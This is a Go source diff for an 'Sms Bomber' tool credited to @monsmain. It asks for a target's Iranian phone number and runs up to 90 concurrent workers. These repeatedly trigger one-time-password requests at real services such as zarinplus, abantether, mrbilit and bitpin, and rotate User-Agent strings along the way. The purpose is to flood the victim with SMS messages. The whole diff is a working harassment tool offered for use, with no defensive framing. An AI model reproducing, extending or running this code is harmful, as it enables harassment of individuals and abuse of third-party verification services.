@@ -18,7 +18,7 @@ import (
 	"time"
 
 	"net/http/cookiejar"
-	"math/rand"
+	"math/rand" // اضافه شده برای انتخاب تصادفی User-Agent
 )
 
 // لیست User-Agentهایی که شما ارائه دادید
@@ -49,7 +49,7 @@ var userAgents = []string{
 	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
 	"Mozilla/5.0 (Linux; Android 13; SM-A546E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.119 Mobile Safari/537.36",
 	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
-	"Mozilla/5.0 (Linux; Android 10; Infinix X682B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Mobile Safari/537.36",
+	"Mozilla/5.0 (Linux; Android 10; Infinix X682B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Mobile Safari/537.136", // مقدار نمونه
 	"Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.4 Mobile Safari/605.1.15",
 	"Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.119 Mobile Safari/537.36",
 	"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
@@ -293,53 +293,52 @@ func main() {
 
 	clearScreen()
 
-	fmt.Print("\033[01;32m")
+fmt.Print("\033[01;32m")
 	fmt.Print(`
-                                :-.
-                         .:  =#-:-----:
-                           **%@#%@@@#*+==:
-                       :=*%@@@@@@@@@@@@@@%#*=:
-                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.
-                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:
-              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%*+*%%*.
-             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:
-            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.
-            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..
-           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.
+                                :-.                                   
+                         .:   =#-:-----:                              
+                           **%@#%@@@#*+==:                            
+                       :=*%@@@@@@@@@@@@@@%#*=:                        
+                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
+                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
+              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
+             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
+            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
+            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
+           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
 `)
 	fmt.Print("\033[01;37m")
 	fmt.Print(`
-           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#
-           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
-           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-
-           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
-            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#
-            -@@@@*:        .  -#@@@@@@#:  .       -#@@@%:
-            *@@%#              -@@@@@@.           #@@@+
-             .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#
-             :@@*             =%@@@@@@%-  faster   *@@:
-              #@@%          .*@@@@#%@@@%+.        %@@+
-              %@@@+       -#@@@@@* :%@@@@@*-     *@@@*
+           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
+           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
+           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
+           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
+            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
+            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
+            *@@%#             -@@@@@@.            #@@@+             
+             .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#              
+             :@@*            =%@@@@@@%-  faster    *@@:              
+              #@@%         .*@@@@#%@@@%+.         %@@+              
+              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
 `)
 	fmt.Print("\033[01;31m")
 	fmt.Print(`
-              *@@@@#++*#%@@@@@@+     #@@@@@@%#+++%@@@@=
-               #@@@@@@@@@@@@@@* Go    #@@@@@@@@@@@@@@*
-                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-
-                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.
-                      #@@@@@@@@@@@@@@@@@@@@@@+
-                       *@@@@@@@@@@@@@@@@@@@@+
-                        +@@%*@@%@@@%%@%*@@%=
-                         +%+ %%.+@%:-@* *%-
-                          .  %# .%#  %+
-                             :.  %+  :.
-                                 -:
+              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=              
+               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
+                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
+                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
+                      #@@@@@@@@@@@@@@@@@@@@@@+                      
+                       *@@@@@@@@@@@@@@@@@@@@+                       
+                        +@@%*@@%@@@%%@%*@@%=                         
+                         +%+ %%.+@%:-@* *%-                          
+                          .  %# .%#  %+                              
+                             :.  %+  :.                              
+                                 -:                                  
 `)
 	fmt.Print("\033[0m")
 
-    // تعداد سرویس های فعال فعلی 1 است
-    totalActiveServices := 1
-	fmt.Printf("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m%d \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m0\n\n", totalActiveServices)
+
+	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
 	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
 	var phone string
 	fmt.Scan(&phone)
@@ -352,18 +351,22 @@ func main() {
 	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mChoose speed [medium/fast]: \033[00;36m")
 	fmt.Scan(&speedChoice)
 
-	var numWorkers int
-	switch strings.ToLower(speedChoice) {
+	var numWorkers int 
+//Code by @monsmain
+	switch strings.ToLower(speedChoice) { 
 	case "fast":
-		numWorkers = 90
+
+		numWorkers = 90 
 		fmt.Println("\033[01;33m[*] Fast mode selected. Using", numWorkers, "workers.\033[0m")
 	case "medium":
-		numWorkers = 40
+
+		numWorkers = 40 
 		fmt.Println("\033[01;33m[*] Medium mode selected. Using", numWorkers, "workers.\033[0m")
 	default:
-		numWorkers = 40
+
+		numWorkers = 40 
 		fmt.Println("\033[01;31m[-] Invalid speed choice. Defaulting to medium mode using", numWorkers, "workers.\033[0m")
-	}
+	}//Code by @monsmain
 
 
 	ctx, cancel := context.WithCancel(context.Background())
@@ -377,18 +380,17 @@ func main() {
 		cancel()
 	}()
 
-    cookieJar, _ := cookiejar.New(nil)
+cookieJar, _ := cookiejar.New(nil)
 	client := &http.Client{
 		Jar: cookieJar,
-		Timeout: 10 * time.Second,
+        Timeout: 10 * time.Second,
 	}
 
-    // کانال ها برای 1 سرویس فعال تنظیم می شوند
-	tasks := make(chan func(), repeatCount * totalActiveServices)
-	ch := make(chan int, repeatCount * totalActiveServices)
-
+	tasks := make(chan func(), repeatCount*40)
 
 	var wg sync.WaitGroup
+
+	ch := make(chan int, repeatCount*40)
 
 	for i := 0; i < numWorkers; i++ {
 		go func() {
@@ -398,30 +400,63 @@ func main() {
 		}()
 	}
 
-	// حلقه اصلی برای اضافه کردن درخواست‌ها
 	for i := 0; i < repeatCount; i++ {
-		// pirankalaco.ir (OTP - POST Form) - اضافه شده
+		
+
+
+
+
+
+		// 1. سرویس zarinplus.com (JSON)
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
-				formData := url.Values{}
-				formData.Set("phone", phone)
-				sendFormRequest(c, ctx, "https://pirankalaco.ir/SendPhone.php", formData, &wg, ch)
+				sendJSONRequest(c, ctx, "https://api.zarinplus.com/user/otp/", map[string]interface{}{
+					"phone_number": getPhoneNumber98NoZero(phone), // نیاز به کد 98 دارد
+					"source": "zarinplus",
+				}, &wg, ch)
 			}
 		}(client)
+		// 3. سرویس api.abantether.com (JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				sendJSONRequest(c, ctx, "https://api.abantether.com/api/v2/auths/register/phone/send", map[string]interface{}{
+					"phone_number": formatPhoneWithSpaces(phone), // از تابع فرمت با فاصله استفاده کنید یا تابع مناسب دیگر
+				}, &wg, ch)
+			}
+		}(client)
+		// mrbilit.ir (OTP - GET)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { // capture client
+			return func() {
+				// در GET، پارامتر به URL اضافه می شود
+				urlWithParam := fmt.Sprintf("https://auth.mrbilit.ir/api/Token/send?mobile=%s", phone) // phone از حلقه اصلی capture می شود
+				sendGETRequest(c, ctx, urlWithParam, &wg, ch)
+			}
+		}(client) // capture client
 
-        // اگر می‌خواهید سرویس‌های دیگری اضافه کنید، بلوک‌های مشابه را اینجا اضافه کنید
-	}
+		// bitpin.org (Authenticate - POST JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { // capture client
+			return func() {
+				payload := map[string]interface{}{
+					"device_type": "web",
+					"password":    "guhguihifgov3",
+					"phone":       phone, // phone از حلقه اصلی capture می شود
+				}
+				sendJSONRequest(c, ctx, "https://api.bitpin.org/v3/usr/authenticate/", payload, &wg, ch)
+			}
+		}(client) 
+}
 
-
-	close(tasks) // بستن کانال tasks پس از ارسال همه وظایف
+	close(tasks)
 
 	go func() {
-		wg.Wait() // منتظر می‌ماند تا همه وظایف wg.Done فراخوانی کنند
-		close(ch) // پس از اتمام همه وظایف، کانال نتایج را می‌بندد
+		wg.Wait()
+		close(ch)
 	}()
 
-	// پردازش نتایج
 	for statusCode := range ch {
 		if statusCode >= 400 || statusCode == 0 {
 			fmt.Println("\033[01;31m[-] Error or Canceled!")
@@ -429,8 +464,5 @@ func main() {
 			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
 		}
 	}
-
-    fmt.Println("\033[01;33m[*] Done sending requests.\033[0m")
-
 }
 //Code by @monsmain
